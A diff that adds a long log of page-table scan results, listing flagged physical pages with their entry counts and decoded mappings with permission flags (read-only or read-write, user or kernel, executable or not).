+    [285] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xd894000: 85 present entries, 0 kdata refs, 1 ktext refs
+    [494] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xd895000: 85 present entries, 0 kdata refs, 1 ktext refs
+    [ 17] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xd970000: 37 present entries, 0 kdata refs, 2 ktext refs
+    [167] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [202] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xd973000: 66 present entries, 0 kdata refs, 2 ktext refs
+    [368] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [403] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xd98d000: 53 present entries, 0 kdata refs, 2 ktext refs
+    [261] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [296] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xd9f1000: 49 present entries, 0 kdata refs, 2 ktext refs
+    [ 69] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [104] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xd9f2000: 69 present entries, 0 kdata refs, 2 ktext refs
+    [ 55] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [ 90] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xda02000: 160 present entries, 0 kdata refs, 1 ktext refs
+    [ 54] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xda48000: 222 present entries, 0 kdata refs, 2 ktext refs
+    [290] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [304] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xda4b000: 205 present entries, 0 kdata refs, 1 ktext refs
+    [269] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xda4c000: 210 present entries, 0 kdata refs, 1 ktext refs
+    [300] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xda61000: 212 present entries, 0 kdata refs, 1 ktext refs
+    [ 35] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xda73000: 164 present entries, 0 kdata refs, 1 ktext refs
+    [393] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xda86000: 213 present entries, 0 kdata refs, 1 ktext refs
+    [133] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xda8b000: 74 present entries, 0 kdata refs, 2 ktext refs
+    [493] 0x0000000011111111 → PA=0x11111000 4KB RO Kern X
+    [509] 0x0000000011111111 → PA=0x11111000 4KB RO Kern X
+
+[!] PT page at PA 0xdb3e000: 173 present entries, 0 kdata refs, 1 ktext refs
+    [ 96] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xdb5b000: 184 present entries, 0 kdata refs, 1 ktext refs
+    [ 85] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xdb6e000: 187 present entries, 0 kdata refs, 1 ktext refs
+    [311] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xde20000: 221 present entries, 0 kdata refs, 1 ktext refs
+    [304] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xde2d000: 199 present entries, 0 kdata refs, 1 ktext refs
+    [ 27] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xde4a000: 216 present entries, 0 kdata refs, 1 ktext refs
+    [ 84] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xde97000: 223 present entries, 0 kdata refs, 1 ktext refs
+    [ 11] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xdea1000: 153 present entries, 0 kdata refs, 1 ktext refs
+    [223] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xdec6000: 183 present entries, 0 kdata refs, 1 ktext refs
+    [141] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xdf5a000: 229 present entries, 0 kdata refs, 1 ktext refs
+    [451] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xdf6b000: 182 present entries, 0 kdata refs, 1 ktext refs
+    [279] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xdf8c000: 221 present entries, 0 kdata refs, 1 ktext refs
+    [309] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xdf92000: 227 present entries, 1 kdata refs, 1 ktext refs
+    [132] 0x4c00000011ba0003 → PA=0x11ba0000 4KB RW Kern X
+
+[!] PT page at PA 0xdf94000: 218 present entries, 0 kdata refs, 1 ktext refs
+    [ 11] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xdfd8000: 207 present entries, 0 kdata refs, 1 ktext refs
+    [166] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xdfe9000: 217 present entries, 0 kdata refs, 1 ktext refs
+    [274] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xdff4000: 223 present entries, 0 kdata refs, 1 ktext refs
+    [266] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe082000: 200 present entries, 0 kdata refs, 2 ktext refs
+    [264] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [322] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe089000: 201 present entries, 0 kdata refs, 2 ktext refs
+    [134] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [213] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe093000: 205 present entries, 0 kdata refs, 1 ktext refs
+    [ 16] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe0ea000: 213 present entries, 1 kdata refs, 1 ktext refs
+    [169] 0xe800000011be000b → PA=0x11be0000 4KB RW Kern NX
+
+[!] PT page at PA 0xe127000: 139 present entries, 11 kdata refs, 0 ktext refs
+    [306] 0x0000000013800065 → PA=0x13800000 4KB RO User X
+    [312] 0x000000001380006b → PA=0x13800000 4KB RW Kern X
+    [316] 0x000000001380007b → PA=0x13800000 4KB RW Kern X
+    [318] 0x0000000013800067 → PA=0x13800000 4KB RW User X
+    [324] 0x0000000013800069 → PA=0x13800000 4KB RO Kern X
+    [328] 0x000000001380006d → PA=0x13800000 4KB RO User X
+    [336] 0x000000001380006f → PA=0x13800000 4KB RW User X
+    [340] 0x0000000013800075 → PA=0x13800000 4KB RO User X
+    [344] 0x000000001380007d → PA=0x13800000 4KB RO User X
+    [348] 0x000000001380007f → PA=0x13800000 4KB RW User X
+    [350] 0x0000000013800077 → PA=0x13800000 4KB RW User X
+
+[!] PT page at PA 0xe130000: 200 present entries, 0 kdata refs, 1 ktext refs
+    [471] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe17e000: 201 present entries, 0 kdata refs, 2 ktext refs
+    [329] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [343] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe18b000: 178 present entries, 0 kdata refs, 1 ktext refs
+    [282] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe18c000: 199 present entries, 0 kdata refs, 1 ktext refs
+    [141] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe198000: 222 present entries, 0 kdata refs, 2 ktext refs
+    [137] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [150] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe214000: 266 present entries, 0 kdata refs, 1 ktext refs
+    [327] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+
+[!] PT page at PA 0xe215000: 239 present entries, 0 kdata refs, 1 ktext refs
+    [457] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+
+[!] PT page at PA 0xe217000: 247 present entries, 0 kdata refs, 1 ktext refs
+    [235] 0x0000000010c244c7 → PA=0x10c24000 2MB RW User X
+
+[!] PT page at PA 0xe21d000: 203 present entries, 0 kdata refs, 1 ktext refs
+    [436] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe21e000: 203 present entries, 0 kdata refs, 1 ktext refs
+    [ 10] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe21f000: 178 present entries, 0 kdata refs, 1 ktext refs
+    [411] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe23a000: 192 present entries, 0 kdata refs, 2 ktext refs
+    [ 33] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [ 59] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe23c000: 193 present entries, 0 kdata refs, 2 ktext refs
+    [ 39] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [136] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe23d000: 218 present entries, 0 kdata refs, 2 ktext refs
+    [391] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [439] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe28e000: 191 present entries, 0 kdata refs, 1 ktext refs
+    [310] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe2a5000: 175 present entries, 0 kdata refs, 3 ktext refs
+    [139] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [208] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [340] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe2a7000: 232 present entries, 0 kdata refs, 1 ktext refs
+    [179] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe2f3000: 64 present entries, 1 kdata refs, 0 ktext refs
+    [447] 0x0000000013402e0f → PA=0x13402000 4KB RW User X
+
+[!] PT page at PA 0xe316000: 193 present entries, 0 kdata refs, 1 ktext refs
+    [269] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe31b000: 210 present entries, 0 kdata refs, 1 ktext refs
+    [ 20] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe354000: 207 present entries, 0 kdata refs, 1 ktext refs
+    [ 12] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe37d000: 133 present entries, 0 kdata refs, 1 ktext refs
+    [483] 0xc010000010d7b625 → PA=0x10d7b000 4KB RO User NX
+
+[!] PT page at PA 0xe39d000: 235 present entries, 0 kdata refs, 1 ktext refs
+    [  8] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe3db000: 210 present entries, 0 kdata refs, 1 ktext refs
+    [138] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe3e1000: 201 present entries, 0 kdata refs, 1 ktext refs
+    [346] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe3e7000: 222 present entries, 0 kdata refs, 1 ktext refs
+    [337] 0xe800000011000005 → PA=0x11000000 4KB RO User NX
+
+[!] PT page at PA 0xe3eb000: 193 present entries, 0 kdata refs, 2 ktext refs
+    [265] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [440] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe448000: 172 present entries, 0 kdata refs, 1 ktext refs
+    [ 84] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe449000: 199 present entries, 0 kdata refs, 1 ktext refs
+    [ 44] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe44e000: 182 present entries, 0 kdata refs, 2 ktext refs
+    [280] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [317] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe454000: 307 present entries, 1 kdata refs, 0 ktext refs
+    [294] 0x01b00000134ae807 → PA=0x134ae000 4KB RW User X
+
+[!] PT page at PA 0xe455000: 261 present entries, 1 kdata refs, 1 ktext refs
+    [157] 0x0f00000011e8c35d → PA=0x11e8c000 4KB RO User X
+
+[!] PT page at PA 0xe58d000: 219 present entries, 0 kdata refs, 1 ktext refs
+    [394] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe59b000: 193 present entries, 0 kdata refs, 1 ktext refs
+    [207] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe5a5000: 187 present entries, 0 kdata refs, 2 ktext refs
+    [162] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [195] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe5a6000: 201 present entries, 0 kdata refs, 1 ktext refs
+    [  7] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe5b6000: 212 present entries, 0 kdata refs, 1 ktext refs
+    [164] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe5c0000: 198 present entries, 0 kdata refs, 1 ktext refs
+    [324] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe5c2000: 214 present entries, 0 kdata refs, 1 ktext refs
+    [324] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe5c7000: 173 present entries, 0 kdata refs, 1 ktext refs
+    [451] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe5c8000: 197 present entries, 0 kdata refs, 2 ktext refs
+    [ 21] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [166] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe5f6000: 179 present entries, 0 kdata refs, 3 ktext refs
+    [310] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [398] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [436] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe62a000: 226 present entries, 0 kdata refs, 1 ktext refs
+    [322] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe62b000: 167 present entries, 0 kdata refs, 1 ktext refs
+    [ 96] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe63f000: 249 present entries, 1 kdata refs, 1 ktext refs
+    [165] 0x4c00000011ba013f → PA=0x11ba0000 4KB RW User X
+
+[!] PT page at PA 0xe64a000: 198 present entries, 0 kdata refs, 3 ktext refs
+    [  5] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [ 21] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [ 67] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe652000: 197 present entries, 0 kdata refs, 1 ktext refs
+    [138] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe653000: 189 present entries, 0 kdata refs, 1 ktext refs
+    [350] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe661000: 227 present entries, 0 kdata refs, 1 ktext refs
+    [269] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe672000: 194 present entries, 0 kdata refs, 1 ktext refs
+    [192] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe69b000: 226 present entries, 0 kdata refs, 1 ktext refs
+    [385] 0x0000000011005d01 → PA=0x11005000 4KB RO Kern X
+
+[!] PT page at PA 0xe6a0000: 192 present entries, 0 kdata refs, 2 ktext refs
+    [357] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [371] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe6a2000: 210 present entries, 0 kdata refs, 1 ktext refs
+    [324] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe6a3000: 177 present entries, 0 kdata refs, 1 ktext refs
+    [324] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe6b6000: 188 present entries, 0 kdata refs, 1 ktext refs
+    [ 39] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe6b8000: 232 present entries, 0 kdata refs, 1 ktext refs
+    [ 13] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe6bc000: 202 present entries, 0 kdata refs, 2 ktext refs
+    [143] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [391] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe6c7000: 158 present entries, 0 kdata refs, 1 ktext refs
+    [150] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe6cd000: 221 present entries, 0 kdata refs, 1 ktext refs
+    [279] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe6d8000: 253 present entries, 0 kdata refs, 1 ktext refs
+    [394] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe6db000: 236 present entries, 0 kdata refs, 1 ktext refs
+    [263] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe700000: 207 present entries, 0 kdata refs, 2 ktext refs
+    [264] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+    [401] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+
+[!] PT page at PA 0xe701000: 190 present entries, 0 kdata refs, 3 ktext refs
+    [ 96] 0x0000000010c244c7 → PA=0x10c24000 2MB RW User X
+    [308] 0x0000000010d644c7 → PA=0x10d64000 2MB RW User X
+    [369] 0x0000000010c244c7 → PA=0x10c24000 2MB RW User X
+
+[!] PT page at PA 0xe72c000: 225 present entries, 0 kdata refs, 1 ktext refs
+    [468] 0x0000000010ca44c7 → PA=0x10ca4000 2MB RW User X
+
+[!] PT page at PA 0xe72d000: 237 present entries, 0 kdata refs, 1 ktext refs
+    [285] 0x0000000010ca44c7 → PA=0x10ca4000 2MB RW User X
+
+[!] PT page at PA 0xe72f000: 245 present entries, 0 kdata refs, 5 ktext refs
+    [ 86] 0x0000000010ca44c7 → PA=0x10ca4000 2MB RW User X
+    [150] 0x0000000010c644c7 → PA=0x10c64000 2MB RW User X
+    [293] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+    [340] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+    [500] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+
+[!] PT page at PA 0xe75d000: 267 present entries, 0 kdata refs, 2 ktext refs
+    [129] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+    [304] 0x0000000010ca44c7 → PA=0x10ca4000 2MB RW User X
+
+[!] PT page at PA 0xe75e000: 193 present entries, 0 kdata refs, 3 ktext refs
+    [ 78] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+    [261] 0x0000000010c244c7 → PA=0x10c24000 2MB RW User X
+    [343] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+
+[!] PT page at PA 0xe75f000: 228 present entries, 0 kdata refs, 3 ktext refs
+    [232] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+    [254] 0x0000000010c644c7 → PA=0x10c64000 2MB RW User X
+    [439] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+
+[!] PT page at PA 0xe78a000: 50 present entries, 0 kdata refs, 2 ktext refs
+    [192] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [227] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xe792000: 169 present entries, 0 kdata refs, 1 ktext refs
+    [ 38] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe7ab000: 191 present entries, 0 kdata refs, 1 ktext refs
+    [406] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe7ac000: 181 present entries, 0 kdata refs, 1 ktext refs
+    [412] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe7e6000: 195 present entries, 0 kdata refs, 1 ktext refs
+    [135] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe7ed000: 240 present entries, 0 kdata refs, 1 ktext refs
+    [109] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+
+[!] PT page at PA 0xe7ee000: 188 present entries, 0 kdata refs, 1 ktext refs
+    [250] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+
+[!] PT page at PA 0xe7ef000: 239 present entries, 0 kdata refs, 2 ktext refs
+    [ 99] 0x0000000010c244c7 → PA=0x10c24000 2MB RW User X
+    [256] 0x0000000010c244c7 → PA=0x10c24000 2MB RW User X
+
+[!] PT page at PA 0xe7f5000: 184 present entries, 0 kdata refs, 1 ktext refs
+    [ 68] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe846000: 161 present entries, 0 kdata refs, 1 ktext refs
+    [418] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe84d000: 182 present entries, 0 kdata refs, 1 ktext refs
+    [145] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe84f000: 184 present entries, 0 kdata refs, 1 ktext refs
+    [ 73] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe860000: 186 present entries, 0 kdata refs, 1 ktext refs
+    [278] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe862000: 180 present entries, 0 kdata refs, 1 ktext refs
+    [187] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe863000: 184 present entries, 0 kdata refs, 1 ktext refs
+    [152] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe867000: 175 present entries, 0 kdata refs, 2 ktext refs
+    [135] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [194] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe963000: 229 present entries, 0 kdata refs, 1 ktext refs
+    [392] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xe97d000: 197 present entries, 0 kdata refs, 1 ktext refs
+    [138] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xec19000: 64 present entries, 0 kdata refs, 2 ktext refs
+    [112] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [147] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xec1b000: 71 present entries, 0 kdata refs, 2 ktext refs
+    [299] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [334] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xec87000: 270 present entries, 1 kdata refs, 1 ktext refs
+    [326] 0x5d00000012b8c35d → PA=0x12b8c000 4KB RO User X
+
+[!] PT page at PA 0xed31000: 203 present entries, 0 kdata refs, 1 ktext refs
+    [266] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xed32000: 192 present entries, 0 kdata refs, 1 ktext refs
+    [138] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xede3000: 199 present entries, 1 kdata refs, 1 ktext refs
+    [212] 0x0720000011a40001 → PA=0x11a40000 4KB RO Kern X
+
+[!] PT page at PA 0xee76000: 184 present entries, 0 kdata refs, 2 ktext refs
+    [207] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [304] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xee77000: 195 present entries, 0 kdata refs, 2 ktext refs
+    [265] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [335] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xeeb2000: 186 present entries, 0 kdata refs, 1 ktext refs
+    [438] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xeefd000: 196 present entries, 0 kdata refs, 1 ktext refs
+    [311] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xef06000: 211 present entries, 0 kdata refs, 1 ktext refs
+    [278] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xef13000: 170 present entries, 0 kdata refs, 2 ktext refs
+    [150] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [212] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xef28000: 212 present entries, 0 kdata refs, 1 ktext refs
+    [  9] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xef36000: 195 present entries, 0 kdata refs, 1 ktext refs
+    [264] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xef3a000: 78 present entries, 0 kdata refs, 1 ktext refs
+    [ 67] 0x8380000010d87ffb → PA=0x10d87000 2MB RW Kern NX
+
+[!] PT page at PA 0xef59000: 145 present entries, 0 kdata refs, 1 ktext refs
+    [407] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xef78000: 176 present entries, 0 kdata refs, 1 ktext refs
+    [438] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xef9e000: 195 present entries, 0 kdata refs, 1 ktext refs
+    [422] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xefbd000: 207 present entries, 0 kdata refs, 1 ktext refs
+    [179] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xefd0000: 200 present entries, 0 kdata refs, 2 ktext refs
+    [ 22] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [138] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xefd8000: 192 present entries, 0 kdata refs, 2 ktext refs
+    [192] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [448] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xefee000: 193 present entries, 0 kdata refs, 1 ktext refs
+    [ 38] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xeff4000: 203 present entries, 0 kdata refs, 2 ktext refs
+    [134] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [213] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf029000: 196 present entries, 0 kdata refs, 2 ktext refs
+    [ 79] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [463] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf039000: 185 present entries, 0 kdata refs, 1 ktext refs
+    [479] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf040000: 183 present entries, 0 kdata refs, 1 ktext refs
+    [ 64] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf05e000: 187 present entries, 0 kdata refs, 1 ktext refs
+    [439] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf067000: 205 present entries, 0 kdata refs, 1 ktext refs
+    [270] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf06d000: 77 present entries, 0 kdata refs, 2 ktext refs
+    [363] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [398] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xf0ab000: 175 present entries, 0 kdata refs, 1 ktext refs
+    [178] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf0cc000: 177 present entries, 0 kdata refs, 1 ktext refs
+    [265] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf0ce000: 201 present entries, 0 kdata refs, 1 ktext refs
+    [310] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf0d0000: 183 present entries, 0 kdata refs, 1 ktext refs
+    [175] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xf0df000: 197 present entries, 0 kdata refs, 1 ktext refs
+    [ 54] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
